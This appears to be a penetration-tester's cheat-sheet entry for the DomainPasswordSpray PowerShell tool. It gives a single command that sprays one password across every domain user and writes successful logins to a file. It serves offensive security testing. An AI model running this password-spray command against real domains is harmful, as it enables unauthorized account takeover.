# DomainPasswordSpray

## DomainPasswordSpray.ps1

### Password spray

Spray a single password across every domain user from a domain-joined Windows host. Pulls the user list and lockout policy automatically; results saved to `spray_success`.

```sh title:"Spray single password across all domain users"
Invoke-DomainPasswordSpray -Password $pass -OutFile spray_success -ErrorAction SilentlyContinue
```
<!-- cheat
var pass
-->

